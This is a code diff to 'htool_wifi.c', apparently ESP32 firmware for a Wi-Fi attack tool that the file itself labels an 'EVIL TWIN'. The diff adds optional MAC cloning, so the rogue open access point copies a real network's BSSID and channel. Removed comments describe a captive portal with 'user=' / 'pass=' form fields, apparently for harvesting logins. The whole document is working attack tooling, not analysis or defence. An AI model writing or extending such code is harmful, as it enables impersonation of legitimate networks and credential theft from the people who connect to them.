@@ -1,9 +1,6 @@
 /*
- * htool_wifi.c - EVIL TWIN FIXED
- * - Matched HTML form names (user= / pass=)
- * - Added "Success" page to unfreeze browser
- * - Fixed DHCP/IP configuration (192.168.4.1)
- * - Restored original if/else logic
+ * htool_wifi.c - EVIL TWIN FIXED + MAC CLONING SUPPORT
+ * Fixed for ESP-IDF v4.3 (Removed esp_mac.h)
  */
 #include <string.h>
 #include "htool_wifi.h"
@@ -13,7 +10,7 @@
 #include "htool_api.h"
 #include "freertos/FreeRTOS.h"
 #include "freertos/task.h"
-#include "esp_system.h"
+#include "esp_system.h" // esp_base_mac_addr_set is here in IDF 4.x
 #include "lwip/sockets.h"
 #include "lwip/err.h"
 #include "esp_netif.h"
@@ -373,7 +370,11 @@ void htool_wifi_captive_portal_start(void *pvParameters) {
         wifi_config.ap.channel = global_scans[captive_portal_task_args.ssid_index].primary;
         wifi_config.ap.authmode = WIFI_AUTH_OPEN;
         wifi_config.ap.max_connection = 4;
-        esp_base_mac_addr_set(global_scans[captive_portal_task_args.ssid_index].bssid);
+        
+        // --- NEW: MAC Cloning Logic ---
+        if (captive_portal_task_args.clone_mac) {
+             esp_base_mac_addr_set(global_scans[captive_portal_task_args.ssid_index].bssid);
+        }
     }
     else {
         if (captive_portal_task_args.cp_index == 0) strcpy((char *)wifi_config.ap.ssid, "Google Free WiFi Test");
